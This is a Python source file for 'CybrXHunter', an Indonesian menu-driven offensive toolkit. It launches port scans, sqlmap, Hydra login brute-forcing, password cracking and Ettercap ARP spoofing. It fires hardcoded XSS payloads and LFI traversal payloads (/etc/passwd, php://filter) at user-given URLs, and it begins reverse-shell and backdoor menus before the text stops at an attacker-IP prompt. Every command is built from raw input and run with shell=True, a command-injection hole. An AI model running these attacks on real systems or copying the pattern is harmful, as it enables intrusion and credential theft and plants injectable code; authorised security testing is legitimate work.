#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import platform
import time
import json
from colorama import init, Fore, Back, Style
import requests
import socket
import webbrowser
import random
import shutil
from datetime import datetime

# Inisialisasi colorama
init(autoreset=True)

# Konfigurasi dasar
VERSION = "1.0.0"
AUTHOR = "Ade Pratama"
LANGUAGE = "id"  # Default bahasa Indonesia
LOG_FILE = "cybrxhunter.log"
CONFIG_FILE = "cybrxhunter_config.json"

# Fungsi untuk menampilkan banner
def show_banner():
    banner = f"""{Fore.RED}
███    ███  ██████  ██████  ███████ ██████  ███    ██ 
████  ████ ██    ██ ██   ██ ██      ██   ██ ████   ██ 
██ ████ ██ ██    ██ ██   ██ █████   ██████  ██ ██  ██ 
██  ██  ██ ██    ██ ██   ██ ██      ██   ██ ██  ██ ██ 
██      ██  ██████  ██████  ███████ ██   ██ ██   ████ 

██      ███████  █████  ██████  ███    ██ ███████ ██████  ███████ 
██      ██      ██   ██ ██   ██ ████   ██ ██      ██   ██ ██      
██      █████   ███████ ██████  ██ ██  ██ █████   ██████  ███████ 
██      ██      ██   ██ ██   ██ ██  ██ ██ ██      ██   ██      ██ 
███████ ███████ ██   ██ ██   ██ ██   ████ ███████ ██   ██ ███████
{Style.RESET_ALL}
    🔖 Versi: {VERSION} | 👤 Author: {AUTHOR} | 🖥️ Platform: {platform.system()}
    💰 DONASI: {Fore.CYAN}https://saweria.co/HolyBytes{Style.RESET_ALL}
    🐱 GITHUB: {Fore.CYAN}https://github.com/HolyBytes{Style.RESET_ALL}
    👥 TEAM: {Fore.YELLOW}Modern Learners{Style.RESET_ALL}
    """
    print(banner)

# Fungsi untuk memeriksa koneksi internet
def check_internet():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

# Fungsi untuk memeriksa dependensi
def check_dependencies():
    required_tools = ["nmap", "sqlmap", "hydra", "dirb", "tcpdump"]
    missing_tools = []
    
    for tool in required_tools:
        if not shutil.which(tool):
            missing_tools.append(tool)
    
    return missing_tools

# Fungsi untuk menampilkan disclaimer
def show_disclaimer():
    disclaimer = f"""
{Fore.RED}[!] PERINGATAN DAN DISCLAIMER{Style.RESET_ALL}
    
1. Tools ini hanya untuk tujuan legal seperti penetration testing dengan izin tertulis.
2. Penggunaan untuk aktivitas ilegal adalah tanggung jawab pengguna sepenuhnya.
3. Penulis tidak bertanggung jawab atas penyalahgunaan tools ini.
4. Pastikan Anda memiliki izin sebelum menguji sistem apapun.

{Fore.YELLOW}Dengan menggunakan tools ini, Anda menyetujui bahwa Anda bertanggung jawab penuh atas tindakan Anda.{Style.RESET_ALL}
"""
    print(disclaimer)
    
    if not confirm_action("Apakah Anda setuju dan ingin melanjutkan?"):
        print(f"{Fore.RED}[!] Dibatalkan oleh pengguna.{Style.RESET_ALL}")
        sys.exit(0)

# Fungsi konfirmasi aksi
def confirm_action(prompt):
    while True:
        response = input(f"{Fore.YELLOW}[?] {prompt} (y/n): {Style.RESET_ALL}").lower()
        if response == 'y':
            print(f"{Fore.GREEN}[+] Oke, melanjutkan proses...{Style.RESET_ALL}")
            return True
        elif response == 'n':
            print(f"{Fore.RED}[-] Dibatalkan oleh pengguna.{Style.RESET_ALL}")
            return False
        else:
            print(f"{Fore.YELLOW}[!] Masukkan 'y' untuk Ya atau 'n' untuk Tidak{Style.RESET_ALL}")

# Fungsi untuk logging
def log_action(action, result=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {action} {result}\n"
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

# Fungsi untuk update tools
def update_tools():
    if not check_internet():
        print(f"{Fore.RED}[-] Tidak ada koneksi internet untuk update.{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}[*] Memeriksa update...{Style.RESET_ALL}")
    
    try:
        # Contoh: Cek versi terbaru dari repo GitHub
        response = requests.get("https://api.github.com/repos/example/cybrxhunter/releases/latest")
        latest_version = response.json()["tag_name"]
        
        if latest_version != VERSION:
            print(f"{Fore.GREEN}[+] Versi terbaru {latest_version} tersedia!{Style.RESET_ALL}")
            if confirm_action("Update ke versi terbaru?"):
                # Proses update bisa ditambahkan di sini
                print(f"{Fore.GREEN}[+] Tools berhasil diupdate!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Anda sudah menggunakan versi terbaru.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Gagal memeriksa update: {str(e)}{Style.RESET_ALL}")

# Fungsi untuk menu utama
def main_menu():
    while True:
        print(f"\n{Fore.BLUE}=== MENU UTAMA ==={Style.RESET_ALL}")
        print("1. Information Gathering")
        print("2. Sniffing & Spoofing")
        print("3. Vulnerability Scanner")
        print("4. Bruteforce Tools")
        print("5. Web Pentesting")
        print("6. Remote Access (For Learning Only)")
        print("7. Pengaturan")
        print("0. Keluar")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih menu (0-7): {Style.RESET_ALL}")
        
        if choice == "1":
            information_gathering_menu()
        elif choice == "2":
            sniffing_spoofing_menu()
        elif choice == "3":
            vulnerability_scanner_menu()
        elif choice == "4":
            bruteforce_menu()
        elif choice == "5":
            web_pentesting_menu()
        elif choice == "6":
            remote_access_menu()
        elif choice == "7":
            settings_menu()
        elif choice == "0":
            print(f"{Fore.GREEN}[+] Keluar dari CybrXHunter. Hati-hati di luar sana!{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menu Information Gathering
def information_gathering_menu():
    while True:
        print(f"\n{Fore.BLUE}=== INFORMATION GATHERING ==={Style.RESET_ALL}")
        print("1. Nmap - Port Scanning")
        print("2. Subfinder - Subdomain Enumeration")
        print("3. Dirb - Directory Bruteforce")
        print("4. WhatWeb - Teknologi Web Detection")
        print("5. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih tool (1-5): {Style.RESET_ALL}")
        
        if choice == "1":
            run_nmap()
        elif choice == "2":
            run_subfinder()
        elif choice == "3":
            run_dirb()
        elif choice == "4":
            run_whatweb()
        elif choice == "5":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menjalankan Nmap
def run_nmap():
    target = input(f"{Fore.YELLOW}[?] Masukkan target (IP/Domain): {Style.RESET_ALL}")
    if not target:
        print(f"{Fore.RED}[-] Target tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    scan_type = input(f"{Fore.YELLOW}[?] Pilih scan type (1. Quick 2. Full 3. Custom): {Style.RESET_ALL}")
    
    if scan_type == "1":
        command = f"nmap -T4 -F {target}"
    elif scan_type == "2":
        command = f"nmap -T4 -A -v {target}"
    elif scan_type == "3":
        options = input(f"{Fore.YELLOW}[?] Masukkan opsi Nmap custom: {Style.RESET_ALL}")
        command = f"nmap {options} {target}"
    else:
        print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")
        return
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Nmap...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"Nmap scan terhadap {target}", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Nmap: {str(e)}{Style.RESET_ALL}")
            log_action(f"Nmap scan terhadap {target}", f"gagal: {str(e)}")

# Fungsi untuk menjalankan Subfinder
def run_subfinder():
    domain = input(f"{Fore.YELLOW}[?] Masukkan domain target: {Style.RESET_ALL}")
    if not domain:
        print(f"{Fore.RED}[-] Domain tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    command = f"subfinder -d {domain} -o subfinder_{domain}.txt"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Subfinder...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            print(f"{Fore.GREEN}[+] Hasil disimpan ke subfinder_{domain}.txt{Style.RESET_ALL}")
            log_action(f"Subfinder scan terhadap {domain}", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Subfinder: {str(e)}{Style.RESET_ALL}")
            log_action(f"Subfinder scan terhadap {domain}", f"gagal: {str(e)}")

# Fungsi untuk menjalankan Dirb
def run_dirb():
    url = input(f"{Fore.YELLOW}[?] Masukkan URL target (contoh: http://example.com): {Style.RESET_ALL}")
    if not url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist (kosongkan untuk default): {Style.RESET_ALL}")
    
    if wordlist:
        command = f"dirb {url} {wordlist}"
    else:
        command = f"dirb {url}"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Dirb...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"Dirb scan terhadap {url}", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Dirb: {str(e)}{Style.RESET_ALL}")
            log_action(f"Dirb scan terhadap {url}", f"gagal: {str(e)}")

# Fungsi untuk menjalankan WhatWeb
def run_whatweb():
    url = input(f"{Fore.YELLOW}[?] Masukkan URL target (contoh: http://example.com): {Style.RESET_ALL}")
    if not url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    command = f"whatweb {url} -v"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan WhatWeb...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"WhatWeb scan terhadap {url}", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan WhatWeb: {str(e)}{Style.RESET_ALL}")
            log_action(f"WhatWeb scan terhadap {url}", f"gagal: {str(e)}")

# Fungsi untuk menu Sniffing & Spoofing
def sniffing_spoofing_menu():
    while True:
        print(f"\n{Fore.BLUE}=== SNIFFING & SPOOFING ==={Style.RESET_ALL}")
        print("1. Wireshark (GUI)")
        print("2. Tcpdump")
        print("3. Ettercap")
        print("4. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih tool (1-4): {Style.RESET_ALL}")
        
        if choice == "1":
            run_wireshark()
        elif choice == "2":
            run_tcpdump()
        elif choice == "3":
            run_ettercap()
        elif choice == "4":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menjalankan Wireshark
def run_wireshark():
    if confirm_action("Wireshark akan membuka antarmuka GUI. Lanjutkan?"):
        try:
            print(f"{Fore.CYAN}[*] Membuka Wireshark...{Style.RESET_ALL}")
            subprocess.run("wireshark", shell=True, check=True)
            log_action("Membuka Wireshark", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal membuka Wireshark: {str(e)}{Style.RESET_ALL}")
            log_action("Membuka Wireshark", f"gagal: {str(e)}")

# Fungsi untuk menjalankan Tcpdump
def run_tcpdump():
    interface = input(f"{Fore.YELLOW}[?] Masukkan interface jaringan (kosongkan untuk default): {Style.RESET_ALL}")
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output (kosongkan untuk tidak menyimpan): {Style.RESET_ALL}")
    
    if interface:
        base_command = f"tcpdump -i {interface}"
    else:
        base_command = "tcpdump"
    
    if output_file:
        command = f"{base_command} -w {output_file}"
    else:
        command = base_command
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Tcpdump...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Tekan Ctrl+C untuk menghentikan{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action("Menjalankan Tcpdump", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Tcpdump: {str(e)}{Style.RESET_ALL}")
            log_action("Menjalankan Tcpdump", f"gagal: {str(e)}")

# Fungsi untuk menjalankan Ettercap
def run_ettercap():
    target = input(f"{Fore.YELLOW}[?] Masukkan target (format: IP/MASK): {Style.RESET_ALL}")
    if not target:
        print(f"{Fore.RED}[-] Target tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    command = f"ettercap -T -M arp {target}"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Ettercap...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Tekan 'q' untuk menghentikan{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"Ettercap ARP spoofing terhadap {target}", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Ettercap: {str(e)}{Style.RESET_ALL}")
            log_action(f"Ettercap ARP spoofing terhadap {target}", f"gagal: {str(e)}")

# Fungsi untuk menu Vulnerability Scanner
def vulnerability_scanner_menu():
    while True:
        print(f"\n{Fore.BLUE}=== VULNERABILITY SCANNER ==={Style.RESET_ALL}")
        print("1. Sqlmap - SQL Injection Test")
        print("2. IDOR Checker")
        print("3. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih tool (1-3): {Style.RESET_ALL}")
        
        if choice == "1":
            run_sqlmap()
        elif choice == "2":
            run_idor_checker()
        elif choice == "3":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menjalankan Sqlmap
def run_sqlmap():
    url = input(f"{Fore.YELLOW}[?] Masukkan URL target (contoh: http://example.com/page?id=1): {Style.RESET_ALL}")
    if not url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    options = input(f"{Fore.YELLOW}[?] Masukkan opsi tambahan Sqlmap (kosongkan untuk default): {Style.RESET_ALL}")
    
    command = f"sqlmap -u {url} {options}"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Sqlmap...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"Sqlmap scan terhadap {url}", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Sqlmap: {str(e)}{Style.RESET_ALL}")
            log_action(f"Sqlmap scan terhadap {url}", f"gagal: {str(e)}")

# Fungsi untuk menjalankan IDOR Checker
def run_idor_checker():
    print(f"{Fore.CYAN}[*] IDOR Checker (Insecure Direct Object Reference){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Fitur ini memerlukan input manual untuk pengujian{Style.RESET_ALL}")
    
    base_url = input(f"{Fore.YELLOW}[?] Masukkan URL dasar (contoh: http://example.com/profile/): {Style.RESET_ALL}")
    if not base_url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    start_id = input(f"{Fore.YELLOW}[?] Masukkan ID awal untuk test: {Style.RESET_ALL}")
    end_id = input(f"{Fore.YELLOW}[?] Masukkan ID akhir untuk test: {Style.RESET_ALL}")
    
    try:
        start_id = int(start_id)
        end_id = int(end_id)
    except ValueError:
        print(f"{Fore.RED}[-] ID harus berupa angka!{Style.RESET_ALL}")
        return
    
    if confirm_action(f"Test ID dari {start_id} sampai {end_id}?"):
        print(f"{Fore.CYAN}[*] Memulai IDOR test...{Style.RESET_ALL}")
        
        for id in range(start_id, end_id + 1):
            test_url = f"{base_url}{id}"
            print(f"\n{Fore.BLUE}[*] Testing: {test_url}{Style.RESET_ALL}")
            
            try:
                response = requests.get(test_url)
                print(f"Status Code: {response.status_code}")
                print(f"Response Length: {len(response.text)}")
                
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Halaman valid: {test_url}{Style.RESET_ALL}")
                    log_action(f"IDOR test valid untuk {test_url}", f"status: {response.status_code}")
                else:
                    print(f"{Fore.YELLOW}[-] Halaman tidak valid: {test_url}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                log_action(f"IDOR test error untuk {test_url}", f"error: {str(e)}")
            
            time.sleep(1)  # Delay untuk menghindari rate limiting

# Fungsi untuk menu Bruteforce
def bruteforce_menu():
    while True:
        print(f"\n{Fore.BLUE}=== BRUTEFORCE TOOLS ==={Style.RESET_ALL}")
        print("1. Hydra - Login Bruteforce")
        print("2. John The Ripper - Password Cracking")
        print("3. Wordlist Generator")
        print("4. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih tool (1-4): {Style.RESET_ALL}")
        
        if choice == "1":
            run_hydra()
        elif choice == "2":
            run_john()
        elif choice == "3":
            wordlist_generator()
        elif choice == "4":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menjalankan Hydra
def run_hydra():
    target = input(f"{Fore.YELLOW}[?] Masukkan target (IP/hostname): {Style.RESET_ALL}")
    if not target:
        print(f"{Fore.RED}[-] Target tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    service = input(f"{Fore.YELLOW}[?] Masukkan service (ssh, ftp, http-form, dll): {Style.RESET_ALL}")
    username = input(f"{Fore.YELLOW}[?] Masukkan username atau path file username: {Style.RESET_ALL}")
    wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
    
    if not os.path.exists(wordlist):
        print(f"{Fore.RED}[-] File wordlist tidak ditemukan!{Style.RESET_ALL}")
        return
    
    command = f"hydra -L {username} -P {wordlist} {target} {service}"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan Hydra...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"Hydra bruteforce terhadap {target} ({service})", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan Hydra: {str(e)}{Style.RESET_ALL}")
            log_action(f"Hydra bruteforce terhadap {target} ({service})", f"gagal: {str(e)}")

# Fungsi untuk menjalankan John The Ripper
def run_john():
    hash_file = input(f"{Fore.YELLOW}[?] Masukkan path file hash: {Style.RESET_ALL}")
    if not os.path.exists(hash_file):
        print(f"{Fore.RED}[-] File hash tidak ditemukan!{Style.RESET_ALL}")
        return
    
    wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist (kosongkan untuk default): {Style.RESET_ALL}")
    
    if wordlist:
        command = f"john --wordlist={wordlist} {hash_file}"
    else:
        command = f"john {hash_file}"
    
    if confirm_action(f"Jalankan perintah: {command}?"):
        try:
            print(f"{Fore.CYAN}[*] Menjalankan John The Ripper...{Style.RESET_ALL}")
            subprocess.run(command, shell=True, check=True)
            log_action(f"John The Ripper crack terhadap {hash_file}", "berhasil")
            
            # Tampilkan hasil cracking
            print(f"\n{Fore.GREEN}[+] Hasil cracking:{Style.RESET_ALL}")
            subprocess.run(f"john --show {hash_file}", shell=True)
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal menjalankan John The Ripper: {str(e)}{Style.RESET_ALL}")
            log_action(f"John The Ripper crack terhadap {hash_file}", f"gagal: {str(e)}")

# Fungsi untuk membuat wordlist custom
def wordlist_generator():
    print(f"\n{Fore.BLUE}=== WORDLIST GENERATOR ==={Style.RESET_ALL}")
    print("1. Berdasarkan kata-kata dasar")
    print("2. Berdasarkan pola")
    print("3. Kembali ke menu Bruteforce")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih metode (1-3): {Style.RESET_ALL}")
    
    if choice == "1":
        base_words = input(f"{Fore.YELLOW}[?] Masukkan kata dasar (pisahkan dengan koma): {Style.RESET_ALL}").split(',')
        output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output: {Style.RESET_ALL}")
        
        if not output_file:
            print(f"{Fore.RED}[-] Nama file output harus diisi!{Style.RESET_ALL}")
            return
        
        variations = []
        for word in base_words:
            word = word.strip()
            if word:
                variations.append(word)
                variations.append(word.upper())
                variations.append(word.lower())
                variations.append(word.capitalize())
                variations.append(word + "123")
                variations.append(word + "!")
                variations.append(word + "123!")
                variations.append(word + "2023")
        
        with open(output_file, 'w') as f:
            for variation in variations:
                f.write(variation + "\n")
        
        print(f"{Fore.GREEN}[+] Wordlist berhasil dibuat: {output_file} ({len(variations)} kata){Style.RESET_ALL}")
        log_action("Membuat wordlist", f"berhasil: {output_file}")
    
    elif choice == "2":
        print(f"{Fore.YELLOW}[!] Contoh pola:")
        print("1. admin[0-9][0-9]")
        print("2. company[2020-2023]")
        print("3. user[a-z][a-z]")
        
        pattern = input(f"{Fore.YELLOW}[?] Masukkan pola (gunakan [] untuk range): {Style.RESET_ALL}")
        output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output: {Style.RESET_ALL}")
        
        if not pattern or not output_file:
            print(f"{Fore.RED}[-] Pola dan nama file harus diisi!{Style.RESET_ALL}")
            return
        
        # Implementasi sederhana untuk pola tertentu
        if '[' in pattern and ']' in pattern:
            prefix = pattern.split('[')[0]
            range_part = pattern.split('[')[1].split(']')[0]
            
            if '-' in range_part:
                start, end = range_part.split('-')
                
                try:
                    if start.isdigit() and end.isdigit():
                        # Numeric range
                        start = int(start)
                        end = int(end)
                        
                        with open(output_file, 'w') as f:
                            for i in range(start, end + 1):
                                f.write(f"{prefix}{i}\n")
                        
                        print(f"{Fore.GREEN}[+] Wordlist berhasil dibuat: {output_file} ({end - start + 1} kata){Style.RESET_ALL}")
                        log_action("Membuat wordlist numerik", f"berhasil: {output_file}")
                    elif len(start) == 1 and len(end) == 1 and start.isalpha() and end.isalpha():
                        # Alphabet range
                        start = start.lower()
                        end = end.lower()
                        
                        with open(output_file, 'w') as f:
                            for c in range(ord(start), ord(end) + 1):
                                f.write(f"{prefix}{chr(c)}\n")
                        
                        print(f"{Fore.GREEN}[+] Wordlist berhasil dibuat: {output_file} ({ord(end) - ord(start) + 1} kata){Style.RESET_ALL}")
                        log_action("Membuat wordlist alfabet", f"berhasil: {output_file}")
                    else:
                        print(f"{Fore.RED}[-] Format range tidak valid!{Style.RESET_ALL}")
                except ValueError:
                    print(f"{Fore.RED}[-] Format range tidak valid!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Format range harus menggunakan '-', contoh: 0-9 atau a-z{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Pola harus mengandung range dalam []{Style.RESET_ALL}")
    
    elif choice == "3":
        return
    else:
        print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menu Web Pentesting
def web_pentesting_menu():
    while True:
        print(f"\n{Fore.BLUE}=== WEB PENTESTING ==={Style.RESET_ALL}")
        print("1. BurpSuite (GUI)")
        print("2. XSS Test")
        print("3. CSRF Test")
        print("4. LFI Test")
        print("5. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih tool (1-5): {Style.RESET_ALL}")
        
        if choice == "1":
            run_burpsuite()
        elif choice == "2":
            run_xss_test()
        elif choice == "3":
            run_csrf_test()
        elif choice == "4":
            run_lfi_test()
        elif choice == "5":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menjalankan BurpSuite
def run_burpsuite():
    if confirm_action("BurpSuite akan membuka antarmuka GUI. Lanjutkan?"):
        try:
            print(f"{Fore.CYAN}[*] Membuka BurpSuite...{Style.RESET_ALL}")
            subprocess.run("burpsuite", shell=True, check=True)
            log_action("Membuka BurpSuite", "berhasil")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Gagal membuka BurpSuite: {str(e)}{Style.RESET_ALL}")
            log_action("Membuka BurpSuite", f"gagal: {str(e)}")

# Fungsi untuk XSS Test
def run_xss_test():
    url = input(f"{Fore.YELLOW}[?] Masukkan URL target (contoh: http://example.com/search?q=): {Style.RESET_ALL}")
    if not url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    if '?' not in url:
        print(f"{Fore.RED}[-] URL harus mengandung parameter (?){Style.RESET_ALL}")
        return
    
    base_url = url.split('?')[0]
    params = url.split('?')[1].split('&')
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "'\"><img src=x onerror=alert('XSS')>"
    ]
    
    print(f"{Fore.CYAN}[*] Memulai XSS test...{Style.RESET_ALL}")
    
    for param in params:
        if '=' in param:
            param_name = param.split('=')[0]
            for payload in xss_payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                print(f"\n{Fore.BLUE}[*] Testing: {test_url}{Style.RESET_ALL}")
                
                try:
                    response = requests.get(test_url)
                    print(f"Status Code: {response.status_code}")
                    
                    if payload in response.text:
                        print(f"{Fore.GREEN}[+] XSS mungkin terdeteksi dengan payload: {payload}{Style.RESET_ALL}")
                        log_action(f"XSS test positif untuk {test_url}", f"payload: {payload}")
                    else:
                        print(f"{Fore.YELLOW}[-] Tidak terdeteksi XSS dengan payload ini{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                    log_action(f"XSS test error untuk {test_url}", f"error: {str(e)}")
                
                time.sleep(1)  # Delay untuk menghindari rate limiting

# Fungsi untuk CSRF Test
def run_csrf_test():
    url = input(f"{Fore.YELLOW}[?] Masukkan URL target (contoh: http://example.com/change_password): {Style.RESET_ALL}")
    if not url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    method = input(f"{Fore.YELLOW}[?] Metode request (GET/POST): {Style.RESET_ALL}").upper()
    
    if method not in ['GET', 'POST']:
        print(f"{Fore.RED}[-] Metode harus GET atau POST!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}[*] Memeriksa proteksi CSRF...{Style.RESET_ALL}")
    
    try:
        response = requests.get(url if method == 'GET' else url, method=method)
        
        # Cek token CSRF dalam form
        if 'csrf' in response.text.lower() or 'token' in response.text.lower():
            print(f"{Fore.GREEN}[+] Kemungkinan ada proteksi CSRF (token terdeteksi){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Tidak terdeteksi proteksi CSRF{Style.RESET_ALL}")
        
        # Cek header Referer
        if 'Referer' in response.request.headers:
            print(f"{Fore.GREEN}[+] Referer header digunakan{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Referer header tidak digunakan{Style.RESET_ALL}")
        
        log_action(f"CSRF test untuk {url}", "selesai")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        log_action(f"CSRF test untuk {url}", f"error: {str(e)}")

# Fungsi untuk LFI Test
def run_lfi_test():
    url = input(f"{Fore.YELLOW}[?] Masukkan URL target dengan parameter file (contoh: http://example.com/page?file=): {Style.RESET_ALL}")
    if not url:
        print(f"{Fore.RED}[-] URL tidak boleh kosong!{Style.RESET_ALL}")
        return
    
    if '?' not in url:
        print(f"{Fore.RED}[-] URL harus mengandung parameter (?){Style.RESET_ALL}")
        return
    
    base_url = url.split('?')[0]
    param = url.split('?')[1].split('=')[0]
    
    lfi_payloads = [
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../../windows/win.ini",
        "....//....//....//....//etc/passwd",
        "%00",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    
    print(f"{Fore.CYAN}[*] Memulai LFI test...{Style.RESET_ALL}")
    
    for payload in lfi_payloads:
        test_url = f"{base_url}?{param}={payload}"
        print(f"\n{Fore.BLUE}[*] Testing: {test_url}{Style.RESET_ALL}")
        
        try:
            response = requests.get(test_url)
            print(f"Status Code: {response.status_code}")
            
            if "root:" in response.text or "[extensions]" in response.text or "<?php" in response.text:
                print(f"{Fore.GREEN}[+] LFI mungkin terdeteksi dengan payload: {payload}{Style.RESET_ALL}")
                log_action(f"LFI test positif untuk {test_url}", f"payload: {payload}")
            else:
                print(f"{Fore.YELLOW}[-] Tidak terdeteksi LFI dengan payload ini{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            log_action(f"LFI test error untuk {test_url}", f"error: {str(e)}")
        
        time.sleep(1)  # Delay untuk menghindari rate limiting

# Fungsi untuk menu Remote Access (For Learning Only)
def remote_access_menu():
    while True:
        print(f"\n{Fore.BLUE}=== REMOTE ACCESS (FOR LEARNING ONLY) ==={Style.RESET_ALL}")
        print("1. Reverse Shell Generator")
        print("2. Backdoor Creator")
        print("3. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih tool (1-3): {Style.RESET_ALL}")
        
        if choice == "1":
            reverse_shell_generator()
        elif choice == "2":
            backdoor_creator()
        elif choice == "3":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk Reverse Shell Generator
def reverse_shell_generator():
    print(f"\n{Fore.BLUE}=== REVERSE SHELL GENERATOR ==={Style.RESET_ALL}")
    print("1. Bash")
    print("2. Python")
    print("3. PHP")
    print("4. Netcat")
    print("5. Perl")
    print("6. Kembali ke menu Remote Access")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih jenis reverse shell (1-6): {Style.RESET_ALL}")
    
    if choice == "6":
        return
    
    lhost = input(f"{Fore.YELLOW}[?] Masukkan LHOST (IP attacker): {Style.RESET_ALL}")
